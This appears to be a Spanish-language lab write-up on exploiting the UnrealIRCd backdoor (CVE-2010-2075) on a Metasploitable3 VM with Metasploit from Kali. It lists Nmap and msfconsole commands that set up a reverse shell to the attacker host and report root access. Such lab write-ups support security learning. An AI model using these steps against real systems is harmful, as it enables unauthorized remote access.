# 💥 Post-Explotación con Metasploit en Metasploitable3

> Explotación de vulnerabilidad UnrealIRCd en máquina Metasploitable3 y acceso root usando Metasploit Framework.

---

## 📋 Descripción

Laboratorio de explotación donde se utilizó **Metasploit Framework** desde Kali Linux para explotar una vulnerabilidad conocida en el servicio **UnrealIRCd** corriendo en la máquina víctima **Metasploitable3**.  
Se obtuvo acceso root completo a la máquina objetivo como resultado del ataque.

---

## 🛠️ Stack y Herramientas

| Tecnología | Uso |
|-----------|-----|
| Kali Linux | Sistema atacante |
| Metasploit Framework | Framework de explotación |
| Metasploitable3 | Máquina víctima (intencionalmente vulnerable) |
| KVM / QEMU | Hipervisor de virtualización |
| Nmap | Reconocimiento previo |

---

## 🌐 Topología del Laboratorio

```
[Fedora 43 - Anfitrión]
       |
  [Red KVM: 192.168.122.0/24]
       |
  ┌────┴────┐
  │         │
[Kali]   [Metasploitable3]
192.168.122.20   192.168.122.128
```

---

## 🔬 Proceso de Explotación

### 1. Reconocimiento inicial
```bash
# Exportar IP local a archivo
ifconfig > ip.txt
nano ip.txt

# Escanear máquina víctima con Nmap
nmap 192.168.122.128
```

### 2. Lanzar Metasploit Framework
```bash
msfconsole
```

### 3. Buscar y seleccionar el exploit
```bash
# Buscar módulos para UnrealIRCd
search unreal ircd

# Seleccionar el módulo (índice 0)
use 0
```

### 4. Configurar el exploit
```bash
# Configurar host objetivo (víctima)
set RHOSTS 192.168.122.128
set RPORT 6697

# Ver payloads disponibles
show payloads

# Seleccionar payload de shell inversa
set payload 6

# Configurar host atacante (nuestra máquina)
set LHOST 192.168.122.20
set LPORT 4444
```

### 5. Ejecutar el exploit
```bash
run
# Resultado: Brecha de seguridad exitosa en Metasploitable3
# Acceso root obtenido ✓
```

---

## 📊 Resultado

```
[*] Started reverse TCP handler on 192.168.122.20:4444
[*] Exploit succeeded → Shell obtenida
[*] Acceso root a la máquina víctima confirmado
```

---

## 🔐 Vulnerabilidad Explotada

| Campo | Detalle |
|-------|---------|
| Servicio | UnrealIRCd |
| Puerto | 6697 |
| CVE | CVE-2010-2075 (backdoor en código fuente) |
| Tipo | Remote Code Execution (RCE) |
| Resultado | Acceso root completo |

---

## 🧠 Aprendizajes

- Uso de Metasploit Framework (`msfconsole`, `search`, `use`, `set`, `run`)
- Concepto de payload y diferencias entre tipos de shells
- Cómo un backdoor en código fuente puede comprometer un servidor completo
- Importancia de actualizar versiones de software expuesto en producción
- Diferencia entre explotación y post-explotación

---

## ⚠️ Aviso Legal

Laboratorio ejecutado en entorno **aislado y controlado** con máquinas **intencionalmente vulnerables**.  
El uso de Metasploit en sistemas sin autorización es **ilegal**.
